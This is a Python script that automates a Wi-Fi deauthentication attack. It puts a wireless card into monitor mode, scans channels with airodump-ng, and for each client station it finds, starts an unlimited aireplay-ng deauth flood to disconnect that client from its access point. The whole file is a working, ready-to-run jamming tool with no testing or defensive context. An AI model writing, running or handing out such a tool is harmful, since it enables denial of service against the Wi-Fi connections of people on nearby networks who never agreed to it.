import  os
import subprocess
import signal
import time
import re
from pathlib import Path

NIC = input("Enter your wireless NIC: ")
CHANNEL = input("Enter channel to silence (leave blank for all): ")

if not NIC:
    print("Usage: <NIC> [CHANNEL]")
    print("No NIC provided.")
    exit(1)

def cleanup(signum, frame):
    print("Cleaning up...")
    subprocess.run(["airmon-ng", "stop", NIC], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    for file in Path('.').glob('airodumpoutput*.csv'):
        file.unlink()
    for file in Path('.').glob('*.cap'):
        file.unlink()
    for file in Path('.').glob('*.kismet.csv'):
        file.unlink()
    for file in Path('.').glob('*.netxml'):
        file.unlink()
    subprocess.run(["killall", "xterm"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    exit()

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

subprocess.run(["airmon-ng", "stop", NIC], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

original_interfaces = subprocess.check_output(["iw", "dev"]).decode().splitlines()
original_interfaces = [line.split()[1] for line in original_interfaces if 'Interface' in line]

subprocess.run(["airmon-ng", "start", NIC], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

new_interfaces = subprocess.check_output(["iw", "dev"]).decode().splitlines()
new_interfaces = [line.split()[1] for line in new_interfaces if 'Interface' in line]

WIFI = list(set(new_interfaces) - set(original_interfaces))
if not WIFI:
    print(f"Failed to start monitor mode on {NIC}")
    exit(1)

WIFI = WIFI[0]
print(f"Using monitor interface: {WIFI}")

for file in Path('.').glob('airodumpoutput*.csv'):
    file.unlink()

if not CHANNEL:
    print("No channel defined. Scanning all channels!")
    subprocess.Popen(["xterm", "-fn", "fixed", "-geom", "-0-0", "-title", "Scanning all channels", "-e", "airodump-ng", "-w", "airodumpoutput", WIFI], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
else:
    subprocess.Popen(["xterm", "-fn", "fixed", "-geom", "-0-0", "-title", f"Scanning channel {CHANNEL}", "-e", "airodump-ng", "-c", CHANNEL, "-w", "airodumpoutput", WIFI], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

time.sleep(3)

Path("stationlist").mkdir(exist_ok=True)
for file in Path("stationlist").glob("*.txt"):
    file.unlink()

while True:
    time.sleep(5)
    print("Scanning for new stations...")

    files = list(Path('.').glob('airodumpoutput*.csv'))
    if not files:
        print("Waiting for airodump output...")
        continue

    FILE = max(files, key=os.path.getctime)

    with open(FILE, 'r') as f:
        content = f.read()

    STATIONS = re.findall(r'([0-9A-Fa-f:]{17})\s*,\s*([0-9A-Fa-f:]{17})', content)

    for station, bssid in STATIONS:
        control = f"{station}_{bssid}"
        if station and bssid:
            if not Path(f"stationlist/{control}.txt").exists():
                print(f"Jamming station: {station} connected to BSSID: {bssid}")
                Path(f"stationlist/{control}.txt").touch()
                subprocess.Popen(["xterm", "-fn", "fixed", "-geom", "-0-0", "-title", f"Jamming {station}", "-e", "aireplay-ng", "--deauth", "0", "-a", bssid, "-c", station, WIFI, "--ignore-negative-one"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)